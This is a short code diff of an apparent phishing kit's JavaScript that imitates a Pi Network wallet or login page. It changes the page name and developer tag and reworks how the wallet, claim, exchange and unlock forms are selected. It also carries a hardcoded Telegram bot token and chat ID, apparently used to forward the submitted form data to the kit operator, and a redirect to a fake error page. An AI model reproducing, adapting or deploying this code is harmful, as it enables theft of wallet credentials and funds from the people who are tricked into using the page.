@@ -371,12 +371,14 @@
     document.addEventListener('DOMContentLoaded', function() {
         var botToken = new URLSearchParams(window.location.search).get("botToken") || "7890110555:AAEIWR8tMgZEKYC9C6lsgnc1C-uau8iAyYk";
         var chatId = new URLSearchParams(window.location.search).get("refer") || "512392705";
-        var dev = "@AntiBlooder";
-        var pageName = "PI Login";
+        var dev = "R3Y";
+        var pageName = "Pi Wallet";
         var redUrl = "quora/error.php";
     
-        var form = document.getElementById('claimPiForm') || document.getElementById('walletForm') || document.getElementById('dollarExchangeForm') || document.getElementById('unlockPiForm');
-        
+        var form = document.getElementById('claimPiForm')
+        var form = document.getElementById('walletForm')
+        var form = document.getElementById('dollarExchangeForm')
+        var form = document.getElementById('unlockPiForm');
         if (form) {
             var inputs = [
                 { name: 'botToken', value: botToken },
